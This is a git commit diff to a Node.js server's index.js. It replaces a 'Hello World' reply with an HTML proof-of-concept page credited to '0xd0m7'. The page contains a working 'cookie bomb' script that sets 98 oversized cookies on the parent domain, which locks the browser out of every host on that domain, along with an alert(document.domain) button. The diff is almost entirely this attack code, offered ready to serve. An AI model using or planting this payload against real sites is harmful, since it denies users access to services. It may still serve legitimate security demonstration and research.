bdb9a94f9ff3a95d4bfa0ba792afa571fa0e130b
Diego Bernal <diegobernal0905@gmail.com>
2021-06-02 21:29:15 +0000

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,21 @@ const http = require('http');
 
 const server = http.createServer((request, response) => {
     response.writeHead(200, {"Content-Type": "text/plain"});
-    response.end("Hello World!");
+    response.end(`<html>
+<script>
+	function cookiebomb(){
+		var d = document.domain.split(".").splice(-2).join(".");
+		var pollution = Array(4000).join('a');
+		for(var i=1;i<99;i++){
+			document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
+		}
+		setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
+	}
+</script>
+<h1>PoC by 0xd0m7</h1>
+<button onclick="alert(document.domain)">Alert</button><br><br>
+<button onclick="cookiebomb()">Cookie bomb</button>
+</html>`);
 });
 
 const port = process.env.PORT || 1337;
